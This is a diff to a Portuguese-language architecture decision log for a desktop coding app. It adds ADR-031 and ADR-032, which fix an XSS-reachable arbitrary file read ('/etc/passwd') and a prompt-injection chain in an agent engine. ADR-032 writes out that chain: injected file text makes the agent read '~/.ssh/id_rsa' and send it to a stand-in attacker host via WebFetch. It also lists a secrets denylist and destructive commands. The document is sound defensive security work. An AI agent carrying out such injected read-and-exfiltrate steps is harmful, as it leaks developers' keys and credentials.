@@ -636,10 +636,12 @@ how-to; linkar o ADR.
   estado até aqui: o macOS assinava e notarizava no `build-local.sh`, mas havia
   **zero checksum em qualquer plataforma** e o `build-local.ps1` não tinha **uma
   linha** de assinatura.
-- **A restrição que define tudo:** a **CI foi removida na 0.4.6** por custo, e o
-  build é 100% local por decisão. Então cada SO é empacotado numa **máquina
-  diferente**, e nenhuma vê os artefatos das outras. O hermes gera o manifesto num
-  `scripts/release.py` de CI; aqui isso não existe para copiar.
+- **A restrição que define tudo:** a **matriz de CI de release foi removida na 0.4.6**
+  por custo e segue local por decisão (02/09/2026: mesmo com a conta em GitHub
+  Enterprise, runners macOS custam 10x nos minutos — ver `docs/build.md`). Então cada
+  SO é empacotado numa **máquina diferente**, e nenhuma vê os artefatos das outras. O
+  hermes gera o manifesto num `scripts/release.py` de CI; aqui isso não existe para
+  copiar.
 - **Decisão:** `scripts/release-manifest.mjs` (Node puro, uma implementação para os
   três SOs — mesmo padrão do `git-sync.mjs` e do `sync-version.mjs`), chamado no fim
   dos dois scripts de build. Ele produz:
@@ -1684,3 +1686,107 @@ executaria código no login do usuário, muito antes deste app.
 - **O aviso do teto de voltas fica mais útil ao usuário** do que subir o teto: se
   o agente estoura 100 voltas, a pergunta certa é "o que está falhando em
   silêncio?", não "quantas voltas mais?".
+
+## ADR-031 — A cerca do Modo Code vem do GESTO do usuário, não do caminho que a página manda
+
+- **Data:** 02/09/2026 · **Status:** Aceito
+
+### Contexto
+
+As ações de arquivo da ponte (`listTree`, `readFile`, `gitStatus`, `gitDiff`, `spawn`)
+confinavam o alvo dentro de um `path` que **a própria página** mandava na mensagem. O
+`read_file` exigia que o arquivo estivesse dentro do `path` — e o `path` vinha de quem estava
+pedindo. Então `readFile('/', '/etc/passwd')` passava, `listTree('/')` também, e
+`setBinding` gravava qualquer caminho como vínculo do projeto.
+
+O token de capacidade (`__t`) fecha **iframe**, não a página: um XSS no SHVIA-WEB — cuja CSP
+nasce desligada — ou um asset de terceiro comprometido roda **na origem que tem o token**. O
+próprio `spawn` reconhece esse ator e por isso valida a `url` antes de mandar a chave junto; a
+mesma mensagem, no mesmo handler, lia qualquer arquivo do disco e devolvia o conteúdo no
+`_reply`.
+
+Achado **F-12** da revisão técnica de 01/09/2026, e o pior consequente dele não é do desktop:
+**a pior consequência de um XSS no SHVIA-WEB deixava de ser "a sessão do usuário" e virava "o
+disco do usuário"** — chave SSH, `.env` de outros projetos, credencial de nuvem.
+
+### Decisão
+
+A cerca passa a ser uma **lista de pastas autorizadas**, e ela só cresce por um caminho: o
+**diálogo nativo** (`pick_folder`). Escolher a pasta é o gesto; nenhuma mensagem da página
+autoriza nada.
+
+- `listTree`, `readFile`, `gitStatus`, `gitDiff` e `spawn` recusam `path` fora da lista, com
+  `codigo: "pasta_nao_autorizada"`.
+- `setBinding` deixa de aceitar caminho livre: só aponta para pasta já autorizada. Sem isso, a
+  página reabriria a cerca por fora — gravava o vínculo e pedia a leitura em seguida.
+- A comparação é de caminho **canônico** e por **componente** (`Path::starts_with`), então
+  `..`, symlink e vizinho de nome parecido (`/x/projeto2` contra `/x/projeto`) não entram.
+
+### Alternativas rejeitadas
+
+**Confiar no token de capacidade.** Ele já existe e não cobre este ator: quem tem XSS na
+página tem o token. O comentário do `spawn` já dizia isso sobre a `url`; faltava aplicar ao
+resto do handler.
+
+**Cercar em "o `path` tem de ser um repositório git".** Não é fronteira de confiança — o
+`/etc` de alguém pode ser um repo, e o `~` de quase todo dev é.
+
+### Consequência que exigiu decisão: a migração
+
+Instalações existentes têm pastas vinculadas em `modo-code-bindings.json`, escrito pela página
+em resposta a um `pickFolder` real. Sem semear a lista com elas, **todo mundo perderia o
+vínculo** e teria de escolher a pasta de novo no primeiro uso.
+
+A lista é semeada **uma única vez** com esses vínculos. O que ela herda é o que já estava lá
+antes desta versão; daí em diante, só o diálogo acrescenta. O resíduo é estreito e está
+escrito: uma instalação **já comprometida antes desta versão** mantém o que gravou. Trocamos
+isso por não quebrar quem nunca foi atacado.
+
+### Prova
+
+`tests_cerca` em `src-tauri/src/code_bridge.rs` — cinco casos, incluindo o vizinho de nome
+parecido e a travessia resolvida.
+
+---
+
+## ADR-032 — Um motor não pode ser a porta dos fundos do outro: a política do `claude-runner`
+
+- **Data:** 02/09/2026 · **Status:** Aceito
+
+### Contexto
+
+O motor "Claude Code (assinatura)" tem política de permissão própria, no hook `PreToolUse` do
+`claude-runner`. Nela, `Read`, `Glob`, `Grep`, `LS` — **de qualquer caminho** — e `WebFetch` e
+`WebSearch` — **para qualquer URL** — eram automáticos. E o nível `--aprovacao auto` liberava
+`Bash` inteiro, inclusive `rm -rf` e `git push --force`.
+
+O outro motor da mesma casca, o `anna`, mantém `curl`/`wget` fora do automático, tem denylist
+de segredos e trata destrutivo como "sempre confirma, `t` não vale". O comentário do próprio
+`claude-runner` diz que *"um motor não pode ser a porta dos fundos do outro"* — e ele era:
+uma injeção de prompt num arquivo do projeto compunha `Read ~/.ssh/id_rsa` → `WebFetch
+https://atacante/?d=…` **sem um único cartão**.
+
+Achado **F-13** da revisão de 01/09/2026.
+
+### Decisão
+
+A política passa a ter a mesma escala do outro motor, e a **cerca vem antes do atalho**:
+
+- `WebFetch`/`WebSearch` saem da lista de leitura — são **saída para a rede** e sempre pedem
+  cartão, em qualquer nível;
+- leitura só é automática **dentro da pasta do projeto** e **fora da denylist de segredos**
+  (a mesma do `anna`: `.env`, `*.pem`, `id_rsa*`, `credentials`, `.ssh/`, `.aws/`, `.git/`) —
+  confinar não bastava, porque o `.env` do próprio projeto está dentro da cerca e é o primeiro
+  alvo de uma injeção;
+- comando destrutivo pede cartão **mesmo no nível `auto`**.
+
+Nada disso **bloqueia**: o que sai do automático vira **cartão**, e quem decide é o dev.
+
+### Consequência de desenho: a política virou módulo
+
+`claude-runner.mjs` roda ao ser importado, então nada dentro dele era testável — a única prova
+era um script que **extrai funções do fonte por regex** e as reexecuta. A fronteira de
+segurança desta casca não tinha teste nenhum (achado F-29). A decisão foi extraída para
+`claude-runner/politica.mjs`, com `node --test claude-runner/politica.test.mjs` (8 testes).
+
+---
